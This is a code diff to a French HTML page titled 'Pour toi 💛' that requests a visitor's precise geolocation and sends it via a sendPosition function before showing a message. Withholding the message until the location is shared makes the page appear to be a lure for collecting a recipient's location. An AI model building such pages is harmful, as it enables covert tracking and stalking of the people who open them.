@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Cache-Control" content="no-store">
+  <meta http-equiv="Pragma" content="no-cache">
   <title>Pour toi 💛</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300;1,400&family=DM+Sans:wght@300;400&display=swap" rel="stylesheet">
@@ -348,19 +350,19 @@
       show('screen-loading');
 
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
+        const watchId = navigator.geolocation.watchPosition(
           async (pos) => {
+            navigator.geolocation.clearWatch(watchId);
             await sendPosition(pos.coords.latitude, pos.coords.longitude);
             show('screen-message');
           },
           () => {
-            // Refus géo ou erreur → afficher écran de refus
+            navigator.geolocation.clearWatch(watchId);
             show('screen-refused');
           },
           { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
         );
       } else {
-        // Géolocalisation non supportée → traiter comme refus
         show('screen-refused');
       }
     }
